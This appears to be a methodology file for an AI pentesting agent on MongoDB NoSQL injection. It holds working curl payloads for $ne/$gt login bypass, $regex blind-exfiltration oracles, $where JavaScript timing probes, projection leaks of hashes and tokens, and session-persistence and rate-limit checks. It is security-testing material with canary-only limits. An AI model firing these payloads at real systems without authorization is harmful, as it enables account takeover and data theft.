---
name: nosql_injection
agent: agent5_injection
description: MongoDB operator injection — $ne/$gt/$regex auth bypass, JSON-vs-form parsing differentials, and data-exfiltration canaries.
---

# NoSQL Injection

## Purpose

Finds injection in NoSQL-backed endpoints (MongoDB first, then CouchDB/others) where SQL payloads fail silently. NoSQLi is missed because testers fire `'` at a JSON API and move on. The real wins: authentication bypass via `$ne`/`$gt` operator injection, boolean exfiltration via `$regex`, and parsing differentials where `a[b]=c` form syntax becomes `{"a":{"b":"c"}}` operator syntax. Real impact: full account takeover without credentials, and blind exfiltration of secrets one character at a time.

## Division of labor

- **Consumes:** API endpoint inventory from `agent2_mapping` (JSON/form/GraphQL endpoints, login and search routes), tech-stack notes from `agent1_recon` (any Mongo/Node/Express signal).
- **Produces:** `findings/nosql_injection.md` — per-endpoint verdict table with operator used, baseline diffs, and raw pairs. Finished artifact; downstream chaining consumes CONFIRMED rows only.

## When to use / when NOT to use

- **Use when:** login or search endpoints accept JSON bodies; error messages mention `MongoError`, `CastError`, `$where`, BSON; query params use bracket syntax (`filter[name]=x`); the stack is Node/Express/Mongoose (check headers and JS bundles for `mongoose`, `mongodb`).
- **Skip when (time-pass filter):** the endpoint strictly validates against a schema and rejects unknown keys with 400 (test two unknown keys to confirm); the login is OAuth-only with no local credential check; the backend is a relational DB confirmed by `sqli_context_map` (don't double-hunt the same parameter — note it and move on).

## Methodology

1. **Map the parsing surface.** For each endpoint, send three shapes: JSON `{"user":"x","pass":"y"}`, form `user=x&pass=y`, and bracketed `user[$ne]=x`. Record status + body length for each. A 200 on the bracketed form where JSON returns 200 differently is a parsing differential — the backend builds queries from raw input.
2. **Baseline the login flow.** Record: valid creds → ?, wrong creds → ? (status, body, redirect, session cookie?). You need the exact wrong-password response; every bypass claim is a diff against it. If you have no valid creds, the wrong-creds response is the only baseline — note that.
3. **Operator-injection auth bypass.** Send `{"username": {"$ne": null}, "password": {"$ne": null}}` as JSON. Then `{"username": {"$gt": ""}, "password": {"$gt": ""}}`. If the response changes from the wrong-creds baseline (200, redirect, Set-Cookie where there was none), you have bypass. Repeat with form encoding: `username[$ne]=&password[$ne]=`.
4. **Confirm the bypass is real.** The new session must do something the wrong-creds session cannot: fetch `/api/me`, `/dashboard`, or any authenticated route with the returned cookie/token. A changed login response that yields no authenticated access is INCONCLUSIVE, not CONFIRMED.
5. **$regex boolean exfiltration canary.** On a search/filter endpoint, test `{"name": {"$regex": "^a"}}` vs `{"name": {"$regex": "^zzz_no_match"}}`. If result counts differ, you have a boolean oracle. Extract ONE character of a benign field (e.g. confirm the admin username starts with a known letter) as proof — stop there.
6. **$where JavaScript injection.** Probe `{"$where": "sleep(2000)"}` and a control `{"$where": "1==1"}`. If the sleep delays and the control does not, note JS execution context (Mongo `$where` runs server-side JS) — CONFIRMED code execution context, hand to `command_injection` skill for the ladder.
7. **Error-message oracle.** Feed type-confused values: `{"age": {"$gt": "notanumber"}}`, arrays where strings are expected, nested operators three deep. Capture any `CastError`, `MongoError`, or stack text — it confirms the driver and query shape for the next round.
8. **NoSQLi in query params.** Some apps build `find(req.query)` directly. Test `?username[$ne]=x`, `?username[$regex]=^a`, `?sort[$gt]=`. Compare against `?username=nonexistentuser` baseline.
9. **Aggregation/projection abuse.** If the endpoint accepts `fields`, `select`, `projection`, or `sort` parameters, try `fields[$gt]=` and `sort[$where]=`. Projection operators can leak fields the API normally hides (password hashes, tokens).
10. **Rate/oracle hygiene.** Blind `$regex` extraction is slow and noisy — do the canary (step 5) and stop. Full exfiltration is a human decision at the review gate, not an autonomous action.
11. **Verdict per endpoint.** CONFIRMED needs the bypass producing real authenticated access, or the oracle diff reproduced twice. Everything else is INCONCLUSIVE or NEGATIVE with payloads logged.

## Exact commands

Parsing surface map:
```bash
echo '--- json ---';    curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -X POST '<TARGET>/api/login' -H 'Content-Type: application/json' -d '{"username":"x","password":"y"}'
echo '--- form ---';    curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -X POST '<TARGET>/api/login' -d 'username=x&password=y'
echo '--- bracket ---'; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -X POST '<TARGET>/api/login' -d 'username[$ne]=x&password[$ne]=y'
```

Operator bypass (JSON and form):
```bash
curl -si -X POST '<TARGET>/api/login' -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null}}' | head -20
curl -si -X POST '<TARGET>/api/login' -d 'username[$gt]=&password[$gt]=' | head -20
```

Confirm the session is real:
```bash
curl -s -o /dev/null -w 'me with bypass cookie: %{http_code}\n' -b 'session=<COOKIE_FROM_BYPASS>' '<TARGET>/api/me'
curl -s -o /dev/null -w 'me with no cookie:      %{http_code}\n' '<TARGET>/api/me'
```

$regex oracle canary:
```bash
curl -s -X POST '<TARGET>/api/search' -H 'Content-Type: application/json' -d '{"name":{"$regex":"^a"}}' | wc -c
curl -s -X POST '<TARGET>/api/search' -H 'Content-Type: application/json' -d '{"name":{"$regex":"^zzz_no_match_9q"}}' | wc -c
```

$where timing with control:
```bash
curl -s -o /dev/null -w 'where-sleep: %{time_total}s\n' -X POST '<TARGET>/api/search' -H 'Content-Type: application/json' -d '{"$where":"sleep(2000)"}'
curl -s -o /dev/null -w 'where-ctrl:  %{time_total}s\n' -X POST '<TARGET>/api/search' -H 'Content-Type: application/json' -d '{"$where":"1==1"}'
```

Error oracle:
```bash
curl -s -X POST '<TARGET>/api/search' -H 'Content-Type: application/json' -d '{"age":{"$gt":"notanumber"}}' | grep -oiE 'mongoerror|casterror|bson|\$where' | head -5
```

## Operator reference

**Auth-bypass shapes (try both JSON and form/bracket encoding):**
- `{"$ne": null}` — matches any non-null value; the classic
- `{"$gt": ""}` — matches any string greater than empty; works when `$ne` is blocklisted
- `{"$in": ["admin", ""]}` — matches any of the listed values
- `{"$regex": ".*"}` — matches everything; also the exfiltration primitive
- `{"$exists": true}` — matches any document where the field exists
- Password field: some apps hash the input first — if `{"$ne": null}` on password fails, the bypass may still work on username alone with a dummy password; test fields independently

**Blind exfiltration alphabet (canary only — one character, then stop):**
- Confirm oracle: `{"field": {"$regex": "^a"}}` vs `{"field": {"$regex": "^zzz_no_match_9q"}}`
- Character set walk (if human approves deeper): `^a` … `^z`, `^0` … `^9`, then second position `^ad` etc. — each request is one boolean answer
- Length oracle first: `{"field": {"$regex": "^.{8}$"}}` variants to learn length before walking characters

**CouchDB / other NoSQL notes:**
- CouchDB Mango queries use the same `$gt`/`$regex` operators — the JSON shapes transfer directly
- Some stacks (Firebase, DynamoDB-style) don't take operators at all — the bracket-encoding test in step 1 distinguishes operator-accepting from operator-rejecting backends in one round

**Defensive tells (NEGATIVE signals, verify twice):**
- Unknown keys rejected with 400 + schema error text (Joi/Zod/Yup) — but retest after noting WHICH validator: some validate only top-level keys and pass nested objects through
- `{"$ne": null}` returns the exact wrong-creds baseline twice — genuine NEGATIVE for that field

## Post-bypass session handling

A bypass that returns a token is only half the finding — what the token unlocks determines severity:

1. **Classify the session artifact.** `Set-Cookie: session=...` (opaque server session) vs JSON body `{"token": "eyJ..."}` (JWT — hand the token to `agent3_auth` for alg/confusion tests) vs `{"user": {...}}` with no token (maybe the response alone leaks data — check it).
2. **Privilege probe.** With the bypassed session, request `/api/me`, `/api/admin`, `/api/users`. Record which roles the bypassed identity has — a bypass that lands you as a low-priv user is still CONFIRMED, but the privilege level sets the chaining priority.
3. **Operator shape in the session itself.** If the session token is a Mongo document ID or contains query-derived data, test whether TAMPERING the session value with operators (`session[$gt]=`) changes privilege — second-order NoSQLi in the session layer.
4. **Logout/session-fixation check.** Does logout invalidate the bypassed session server-side? If the session survives logout, note it — it means the bypass is also a persistence primitive.
5. **Rate-limit reality check.** Some apps rate-limit logins but not the BYPASSED path (no failed attempts are logged when `$ne` matches). Confirm by firing 20 bypass attempts rapidly — if none are throttled, the bypass doubles as a brute-force amplifier.

## Completion-bias defenses

- [ ] All three parsing shapes tested per endpoint (JSON, form, bracketed)
- [ ] Wrong-creds baseline response captured before any bypass attempt
- [ ] `$ne` and `$gt` bypass tried in both JSON and form encoding
- [ ] Bypass confirmed by accessing an authenticated route with the new session — not just a changed login response
- [ ] `$regex` oracle canary run with match and no-match patterns
- [ ] `$where` tested with sleep AND a fast control
- [ ] Query-param operator injection tested where the endpoint reads `req.query`
- [ ] Projection/sort parameters probed for operator acceptance
- [ ] No full exfiltration runs — canary only, human decides the rest
- [ ] `findings/nosql_injection.md` exists with the verdict table and raw pairs
- **Review step:** agent10_review must verify (a) the bypass session actually accessed an authenticated route, (b) the oracle diff reproduced twice, (c) no data beyond one benign canary character was extracted.
- **Nudge prompts:**
  - "Keep going until you have tested JSON, form, AND bracket encodings on every endpoint — the differential is the bug."
  - "A changed login page is not a bypass. Prove the session works on /api/me before you claim anything."
  - "Do not report done before findings/nosql_injection.md exists on disk."
- **Finished artifact definition:** `findings/nosql_injection.md` — per-endpoint table (endpoint, encodings tested, operator, verdict, session-proof) + raw request/response pairs.

## Evidence standard

- Baseline: wrong-creds response and per-encoding normal response saved before probing.
- Reproduction: bypass reproduced 2x with fresh requests; oracle diff reproduced 2x.
- Raw evidence: full request body and full response (headers included — Set-Cookie is the proof).
- Verdicts: CONFIRMED (bypass yields working authenticated session, or oracle diff 2x) / INCONCLUSIVE (response changed but session unproven) / NEGATIVE (all encodings return baseline).

## Handoffs

- `agent9_chaining`: consumes CONFIRMED bypasses — account takeover chains, privilege escalation via the hijacked session.
- `command_injection`: consumes CONFIRMED `$where` JS execution — ladder into OS command context.
- `agent10_review`: consumes `findings/nosql_injection.md` — verifies session proof before shipping.
